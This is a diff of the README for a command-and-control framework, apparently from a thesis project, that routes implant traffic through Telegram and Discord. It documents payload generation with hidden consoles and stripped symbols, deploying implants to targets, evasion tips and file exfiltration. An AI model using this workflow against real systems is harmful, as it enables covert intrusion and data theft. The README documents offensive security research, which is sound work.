@@ -1,87 +1,134 @@
 # Vanessa C2
 
 <p align="center">
-  <img src="./assets/README-img/vanissa-c2.jpeg" alt="Vanessa C2 Logo" width="400"/>
+  <img src="./assets/README-img/vanissa-c2.jpeg" alt="Vanessa C2" width="400"/>
 </p>
 
 <p align="center">
-  <img src="https://img.shields.io/badge/status-in%20development-yellow" alt="Status"/>
+  <img src="https://img.shields.io/badge/type-C2%20Framework-critical" alt="Type"/>
+  <img src="https://img.shields.io/badge/technique-Living%20off%20Trusted%20Services-blueviolet" alt="Technique"/>
   <img src="https://img.shields.io/badge/python-3.10+-blue" alt="Python"/>
   <img src="https://img.shields.io/badge/go-1.21+-00ADD8" alt="Go"/>
   <img src="https://img.shields.io/badge/platform-windows%20%7C%20linux-orange" alt="Platform"/>
+  <img src="https://img.shields.io/badge/deploy-docker-2496ED" alt="Docker"/>
   <img src="https://img.shields.io/badge/license-MIT-green" alt="License"/>
-  <img src="https://img.shields.io/badge/encryption-AES--256--GCM-red" alt="Encryption"/>
 </p>
 
-> ⚠️ **Educational PoC only.** This project is part of a master's thesis on *Living off Trusted Services* (LoTS) C2 evasion techniques. Use only on systems you own or have explicit written permission to test.
+> ⚠️ **Educational Proof-of-Concept Only.**
+> This project was developed as part of a master's thesis researching *Living off Trusted Services* (LoTS) — a class of C2 evasion techniques that abuse legitimate cloud platforms to proxy adversary traffic. **Deploy only on systems you own or have explicit written authorization to test.** Unauthorized use is illegal under the Computer Fraud and Abuse Act (CFAA), the UK Computer Misuse Act, and equivalent legislation worldwide.
 
 ---
 
-## What is Vanessa C2?
+## Overview
 
-**Vanessa C2** is a proof-of-concept Command & Control framework that leverages **Cloud-based and Public Legitimate Services (CPLS)** — specifically **Telegram** and **Discord** — as its communication channels. All C2 traffic rides on legitimate HTTPS APIs, making it indistinguishable from normal platform usage to network defenders.
+**Vanessa C2** is a post-exploitation Command & Control framework that leverages **Cloud-based Public Legitimate Services (CPLS)** — specifically **Telegram** and **Discord** — as its communication channels.
 
-### Key Capabilities
+Instead of standing up custom C2 infrastructure (domains, VPS, redirectors) that can be burned by threat intelligence, Vanessa rides on trusted third-party HTTPS APIs. From a network defense perspective, the traffic is indistinguishable from an employee using Discord or Telegram — standard TLS connections to `discord.com` and `api.telegram.org`.
 
-- **Multi-channel C2** — Telegram + Discord with runtime channel switching
-- **AES-256-GCM encryption** — All protocol messages encrypted end-to-end
-- **Jitter & evasion** — Randomized beacon intervals to defeat NDR fingerprinting
+### Why This Matters
+
+Traditional C2 frameworks (Cobalt Strike, Sliver, Mythic) require dedicated infrastructure that defenders actively hunt. LoTS frameworks eliminate this attack surface entirely:
+
+| Aspect | Traditional C2 | Vanessa C2 (LoTS) |
+|--------|---------------|-------------------|
+| **Infrastructure** | Custom domains, VPS, redirectors | None — uses Telegram/Discord APIs |
+| **Network visibility** | Suspicious domains, unusual TLS certs | Traffic to trusted, allowlisted domains |
+| **DNS blocking** | Easily blocked | Blocking Discord/Telegram breaks business ops |
+| **NDR detection** | ML heuristics can flag beacon patterns | Blends with millions of legitimate API calls |
+| **Burn risk** | High — domains get flagged fast | Low — platform accounts are disposable |
+
+---
+
+## Key Capabilities
+
+- **Multi-channel C2** — Telegram + Discord with live runtime channel switching
+- **On-demand payload generation** — Cross-compile agents with unique, per-target tokens baked in at build time
+- **Jitter & evasion** — Randomized beacon intervals to defeat frequency-analysis-based NDR detection
 - **Persistent state** — SQLite-backed agent registry survives server restarts
-- **File exfiltration** — Download files from targets
-- **Interactive shell** — Full operator console with agent selection
-- **Agent health monitoring** — Automatic reaper marks dead agents
+- **File exfiltration** — Download files from compromised targets
+- **Interactive operator console** — Full shell with agent selection, channel switching, and health monitoring
+- **Agent reaper** — Automatically marks dead agents based on last-seen timestamps
+- **Dockerized deployment** — One-command install, server runs in Docker
 
 ---
 
 ## Architecture
-<img src="./assets/README-img/diagram.png" alt="Vanessa C2 Logo" width="600"/>
+
+<p align="center">
+  <img src="./assets/README-img/diagram.png" alt="Vanessa C2 Architecture" width="700"/>
+</p>
+
+### Communication Flow
+
+```
+┌──────────────┐     HTTPS/TLS      ┌─────────────────┐     HTTPS/TLS      ┌──────────────┐
+│   Operator    │ ──────────────────▶│   Telegram API   │◀────────────────── │    Agent     │
+│   Console     │                    │   Discord API    │                    │  (Target)    │
+│  (Python)     │                    │  (Trusted Cloud) │                    │   (Go)       │
+└──────────────┘                    └─────────────────┘                    └──────────────┘
+      │                                                                          │
+      │  INSTRUCTION|agent_id|instr_id|whoami                                   │
+      │ ──────────────────────────────────────────────────────────────────────▶  │
+      │                                                                          │
+      │                                    RESULT|agent_id|instr_id|output       │
+      │ ◀──────────────────────────────────────────────────────────────────────  │
+```
+
+**All traffic passes through legitimate cloud APIs.** Network defenders see encrypted HTTPS connections to trusted domains — nothing more.
 
 ---
 
 ## Tech Stack
 
-| Component | Technology |
-|-----------|------------|
-| **Server** | Python 3.10+, Flask, Telethon (MTProto), discord.py |
-| **Client** | Go 1.21+, discordgo |
-| **Database** | SQLite (`vanessa.db`) |
-| **Encryption** | AES-256-GCM (SHA-256 key derivation) |
-| **Channels** | Telegram Bot API, Discord Bot API |
+| Component | Technology | Purpose |
+|-----------|------------|---------|
+| **Server** | Python 3.10+, Flask, Telethon (MTProto), discord.py | Operator console, agent management, channel orchestration |
+| **Agent** | Go 1.22+, discordgo | Cross-platform implant (Windows/Linux) |
+| **Database** | SQLite | Persistent agent registry, instruction logging |
+| **Channels** | Telegram Bot API, Discord Bot API | C2 transport layer |
+| **Deployment** | Docker, Docker Compose | Server containerization, agent cross-compilation |
 
 ---
 
 ## Project Structure
 
 ```
-vanessa-c2/
-├── server/
-│   ├── app.py                  # Operator console + Flask API
+Vanessa-C2/
+├── install.sh                      # One-command installer
+├── Makefile                        # make install / make uninstall
+├── vanessa                         # CLI wrapper (→ /usr/local/bin/vanessa)
+├── docker-compose.yml              # Server container orchestration
+│
+├── server/                         # ── C2 Server (Python) ──────────────
+│   ├── Dockerfile                  # Server container image
+│   ├── app.py                      # Operator console + Flask API
 │   ├── core/
-│   │   ├── agent.py            # Agent registry + reaper
-│   │   ├── channel.py          # Abstract C2Channel interface
-│   │   ├── crypto.py           # AES-256-GCM encryption (Python)
-│   │   └── database.py         # SQLite persistence layer
+│   │   ├── agent.py                # Agent registry + reaper thread
+│   │   ├── channel.py              # Abstract C2Channel interface
+│   │   └── crypto.py               # Protocol encoding (Python)
 │   ├── channels/
-│   │   ├── telegram.py         # Telegram channel (Telethon)
-│   │   └── discord.py          # Discord channel (discord.py)
-│   ├── .env                    # API credentials + C2_SECRET
+│   │   ├── telegram.py             # Telegram channel (Telethon MTProto)
+│   │   └── discord.py              # Discord channel (discord.py)
+│   ├── .env.example                # Template — API credentials
 │   └── requirements.txt
 │
-├── client/
-│   ├── main.go                 # Agent entry point + .env loader
+├── client/                         # ── Agent / Implant (Go) ────────────
+│   ├── Dockerfile.build            # Go cross-compiler image
+│   ├── main.go                     # Entry point — tokens injected via -ldflags
 │   ├── core/
-│   │   ├── config.go           # AgentConfig (jitter, encryption key)
-│   │   ├── identity.go         # Deterministic agent ID generation
-│   │   ├── interfaces.go       # C2Channel interface
-│   │   └── handlers.go         # Shared command handlers
+│   │   ├── config.go               # AgentConfig (jitter, intervals)
+│   │   ├── identity.go             # Deterministic agent ID (SHA-256)
+│   │   ├── channel.go              # C2Channel interface
+│   │   └── beacon.go               # Beacon logic
 │   ├── channels/
-│   │   ├── telegram/client.go  # Telegram channel (HTTP polling)
-│   │   └── discord/client.go   # Discord channel (discordgo)
+│   │   ├── telegram/client.go      # Telegram channel (HTTP long-polling)
+│   │   └── discord/client.go       # Discord channel (WebSocket via discordgo)
 │   ├── utils/
-│   │   └── encoding.go         # AES-256-GCM encryption (Go)
-│   ├── .env                    # Bot tokens + C2_SECRET
-│   ├── go.mod / go.sum
+│   │   └── encoding.go             # Protocol encoding (Go)
+│   └── .env.example                # Template — not shipped with payloads
 │
+├── generator/
+│   └── generate.sh                 # Payload generator (token injection)
 │
 └── assets/
     └── README-img/
@@ -89,26 +136,35 @@ vanessa-c2/
 
 ---
 
-## Setup
+## Quick Start
 
 ### Prerequisites
 
-- Python 3.10+ with `pip`
-- Go 1.21+
-- A Telegram account + API credentials from [my.telegram.org/apps](https://my.telegram.org/apps)
-- A Telegram bot (via [@BotFather](https://t.me/BotFather))
-- A Discord bot + server (via [Discord Developer Portal](https://discord.com/developers/applications))
+- **Docker** + **Docker Compose V2** (mandatory)
+- **Go 1.21+** (optional — Docker handles cross-compilation)
+- Telegram account + API credentials from [my.telegram.org/apps](https://my.telegram.org/apps)
+- Telegram bot via [@BotFather](https://t.me/BotFather)
+- Discord bot + server via [Discord Developer Portal](https://discord.com/developers/applications)
 
-### 1. Clone
+### 1. Clone & Install
 
 ```bash
 git clone https://github.com/SaadAzil3/Vanessa-C2.git
 cd Vanessa-C2
+make install
 ```
 
-### 2. Server Setup
+This will:
+- Check Docker is installed
+- Build the C2 server Docker image
+- Build the Go cross-compiler image (for payload generation)
+- Install the `vanessa` CLI to `/usr/local/bin/`
+- Create `~/.vanessa/payloads/` for generated agents
 
-Create `server/.env`:
+### 2. Configure
+
+Edit `server/.env` with your API keys:
+
 ```env
 API_ID=12345678
 API_HASH=your_api_hash
@@ -117,118 +173,183 @@ BOT_TOKEN=your_telegram_bot_token
 CHAT_ID=-100xxxxxxxxxx
 DISCORD_TOKEN=your_discord_bot_token
 DISCORD_CHANNEL_ID=your_discord_channel_id
-C2_SECRET=your_shared_encryption_key
 ```
 
-#### Option A: Docker (Recommended One-Command Setup)
-No local Python environment is needed. Ensure Docker and Docker Compose are installed.
-
-#### Option B: Manual Local Setup
-```bash
-cd server
-python -m venv env
-source env/bin/activate
-pip install -r requirements.txt
-```
-
-### 3. Client Setup
+### 3. Start the Server
 
 ```bash
-cd client
-go mod tidy
+vanessa server
 ```
 
-Create `client/.env`:
-```env
-BOT_TOKEN=your_telegram_bot_token
-CHAT_ID=-100xxxxxxxxxx
-DISCORD_TOKEN=your_discord_bot_token
-C2_SECRET=your_shared_encryption_key
+### 4. Generate a Payload
+
+```bash
+vanessa generate
 ```
 
-> ⚠️ The `C2_SECRET` **must match** on both server and client for encrypted comms to work.
+```
+  ╔════════════════════════════════════════╗
+  ║  Vanessa C2 — Payload Generator        ║
+  ╚════════════════════════════════════════╝
+
+  Target OS [windows/linux]: windows
+  Telegram Bot Token: 87012334:AAFFFMko...
+  Telegram Chat ID: -1003728125166
+  Discord Bot Token: MTQ5MDI5Mjcw...
+
+  [*] Cross-compiling agent for windows/amd64...
+
+  ╔════════════════════════════════════════╗
+  ║  ✓ Payload Generated Successfully       ║
+  ╚════════════════════════════════════════╝
+
+  File:    ~/.vanessa/payloads/agent_windows_20260501_143022.exe
+  OS:      windows/amd64
+  Size:    6.8M
+  SHA256:  a3f9c8b2e1...
+```
+
+Each payload has **unique tokens baked into the binary** at compile time via Go's `-ldflags -X`. No `.env` files, no config files — a single static binary.
+
+### 5. Deploy & Operate
+
+Transfer the payload to the target. Once executed, the agent checks in:
+
+```bash
+vanessa attach
+```
+
+```
+  ★ Agent checked in: a3f9c8b2 (DESKTOP-PC / admin@192.168.1.50) via telegram
+
+vanessa(DESKTOP-PC)> whoami
+  desktop-pc\admin
+
+vanessa(DESKTOP-PC)> switch discord
+  SWITCH command sent to a3f9c8b2 → discord
+  ↔ Agent a3f9c8b2 switched to discord
+```
 
 ---
 
-## Usage
+## CLI Reference
 
-### Start the Server
-
-#### Option A: Using Docker (Recommended)
-```bash
-# Build and start the C2 server in the background
-docker compose up -d --build
-
-# Attach to the interactive operator console
-docker attach vanessa-c2-server
-```
-> **Note:** To detach from the console and leave the C2 running, press `Ctrl+P` then `Ctrl+Q`. Typing `exit` will kill the server.
-
-#### Option B: Manual Local Setup
-```bash
-cd server
-source env/bin/activate
-python app.py
-```
-
-```text
-[+] Encryption: ENABLED (AES-256-GCM)
-[+] Telegram channel configured
-[+] Discord channel configured
-[+] Flask API running on http://127.0.0.1:5000
-[+] Active channels: ['telegram', 'discord']
-
-╔══════════════════════════════════════════╗
-║  VANESSA C2 — Operator Console           ║
-║  Type 'help' for available commands      ║
-╚══════════════════════════════════════════╝
-
-vanessa>
-```
-
-### Start the Agent
-
-```bash
-cd client
-go run main.go
-```
+After installation, all operations are managed through the `vanessa` command:
 
 ```
-Encryption: ENABLED (AES-256-GCM)
-Agent ID: abc123de
-Telegram channel available
-Discord channel available
+vanessa <command>
+
+Commands:
+  server       Start the C2 server (Docker)
+  stop         Stop the C2 server
+  attach       Attach to the operator console
+  generate     Generate a new agent payload
+  payloads     List all generated payloads
+  logs         Tail server logs
+  status       Show server health status
+  uninstall    Remove vanessa from system
 ```
 
-### Operator Commands
+## Operator Console Commands
+
+Once attached to the operator console (`vanessa attach`):
 
 | Command | Description |
 |---------|-------------|
-| `agents` | List all connected agents |
-| `use <id>` | Select an agent to interact with |
+| `agents` | List all connected agents with status |
+| `use <id>` | Select an agent to interact with (supports partial ID match) |
+| `info` | Show detailed information on selected agent |
 | `back` | Deselect current agent |
-| `switch <channel>` | Switch agent to telegram/discord |
-| `sleep <seconds>` | Put agent to sleep |
-| `jitter <min> <max>` | Set randomized beacon interval |
-| `download <path>` | Exfiltrate a file from target |
-| `sysinfo` | Get system information |
-| `ifconfig` / `netstat` | Network info (auto-detects OS) |
-| `persist` | Install persistence mechanism |
-| `kill` | Terminate the agent |
-| `exit` | Shut down the server |
-| `<any command>` | Execute shell command on target |
+| `channels` | List active C2 channels |
+| `switch <channel>` | Switch agent to `telegram` or `discord` at runtime |
+| `download <path>` | Exfiltrate a file from the target |
+| `sysinfo` | Get target system information |
+| `kill` | Terminate the agent process |
+| `exit` | Shut down the C2 server |
+| `<any command>` | Execute a shell command on the target |
+
+> **Tip:** Detach from the console without stopping the server: `Ctrl+P`, then `Ctrl+Q`.
+
+---
+
+## How Payload Generation Works
+
+Traditional C2 agents ship with config files or fetch their configuration from a staging server. Vanessa takes a different approach — **tokens are injected directly into the Go binary at compile time**.
+
+```
+Operator provides tokens
+        │
+        ▼
+go build -ldflags="-X main.telegramToken=XXX
+                   -X main.telegramChatID=YYY
+                   -X main.discordToken=ZZZ
+                   -s -w -H windowsgui"
+        │
+        ▼
+Single static binary (no config files, no .env)
+```
+
+This means:
+- **Each payload is unique** — different tokens per target/engagement
+- **No config files on disk** — nothing for EDR file-scanning to flag
+- **Burned tokens don't cascade** — compromising one agent's tokens doesn't compromise others
+- **Symbols stripped** — `-s -w` removes debug info, `-H windowsgui` hides the console window on Windows
+
+---
+
+## Protocol
+
+### Message Format
+
+All C2 communication uses a simple pipe-delimited protocol riding on platform messages:
+
+```
+CHECKIN|<agent_id>|<hostname>|<os>|<user>|<ip>
+INSTRUCTION|<agent_id>|<instr_id>|<command>
+RESULT|<agent_id>|<instr_id>|<output>
+SWITCH|<agent_id>|<channel_name>
+SWITCHACK|<agent_id>|<channel_name>
+```
+
+### Transport Security
+
+All traffic is encrypted by the native **HTTPS/TLS** of the Telegram and Discord APIs. To a network defender sniffing the wire, it's indistinguishable from normal platform usage.
+
+---
+
+## Limitations & OPSEC Considerations
+
+| Concern | Details |
+|---------|---------|
+| **Message size** | Telegram: 4096 chars, Discord: 2000 chars — output is truncated |
+| **Rate limiting** | Both platforms enforce API rate limits that affect beacon frequency |
+| **Token extraction** | If an analyst reverse-engineers the agent binary, they can extract the tokens. Mitigations: compile with `garble`, use XOR string obfuscation |
+| **Platform bans** | Telegram/Discord can ban bot accounts if flagged for abuse |
+| **Payload OpSec** | Data is sent as plaintext to the platform APIs (encrypted in transit by TLS, but visible to the platform). A production C2 would add AES-256-GCM payload encryption |
 
 ---
 
 ## Disclaimer
 
-This tool is intended for **educational purposes** and **authorized penetration testing only**. It was developed as part of a master's thesis on network evasion techniques using legitimate cloud services. Unauthorized use against systems you do not own or have explicit permission to test is **illegal and unethical**.
+```
+╔══════════════════════════════════════════════════════════════════════════╗
+║  This tool is developed strictly for EDUCATIONAL PURPOSES and           ║
+║  AUTHORIZED SECURITY TESTING as part of a master's thesis on            ║
+║  network evasion techniques using legitimate cloud services.            ║
+║                                                                          ║
+║  You are solely responsible for ensuring that your use of this tool      ║
+║  complies with all applicable laws and regulations. The author           ║
+║  assumes no liability for misuse.                                        ║
+║                                                                          ║
+║  Unauthorized access to computer systems is a criminal offense.          ║
+╚══════════════════════════════════════════════════════════════════════════╝
+```
 
 ---
 
 ## Author
 
-**Saad Azil** — Cybersecurity student
+**Saad Azil** — Cybersecurity Master's Student
 
 ---
 
